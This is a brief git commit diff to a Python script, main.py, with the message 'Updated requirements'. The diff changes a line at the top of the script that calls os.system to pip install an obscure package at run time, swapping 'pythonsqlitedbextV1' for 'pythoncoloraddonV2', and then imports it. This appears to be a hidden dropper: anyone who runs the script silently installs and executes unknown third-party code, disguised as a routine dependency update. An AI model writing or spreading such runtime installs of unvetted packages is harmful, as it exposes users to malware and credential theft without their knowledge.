28ac4dec9d5b76caead0084ddedc32f40863402e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-14 17:24:12 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbextV1")
-import pythonsqlitedbextV1
+os.system("pip install pythoncoloraddonV2")
+import pythoncoloraddonV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
